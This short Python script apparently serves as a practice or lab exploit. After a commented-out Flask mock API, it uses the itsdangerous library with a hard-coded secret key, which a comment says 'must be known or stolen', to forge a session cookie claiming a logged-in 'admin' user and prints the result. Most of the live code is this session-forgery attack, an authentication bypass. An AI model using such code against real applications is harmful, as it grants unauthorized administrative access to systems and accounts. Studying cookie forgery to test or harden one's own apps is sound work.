# from flask import Flask, jsonify

# app = Flask(__name__)

# @app.route('/api/data')
# def mock_data():
#     data = [
#         {"id": 1, "title": "First Post", "content": "This is the first post."},
#         {"id": 2, "title": "Second Post", "content": "This is the second post."}
#     ]
#     return jsonify(data)

# if __name__ == "__main__":
#     app.run(debug=True, port=5001)
from itsdangerous import URLSafeTimedSerializer
import base64

# The secret key of the Flask app (must be known or stolen)
secret_key = 'admin@Daksh'

# Create a serializer using the secret key
serializer = URLSafeTimedSerializer(secret_key)

# Original session data
original_data = {'logged_in': True, 'username': 'admin'}

# Encode the session data into a cookie
cookie = serializer.dumps(original_data)

print(f"Forged session cookie: {cookie}")
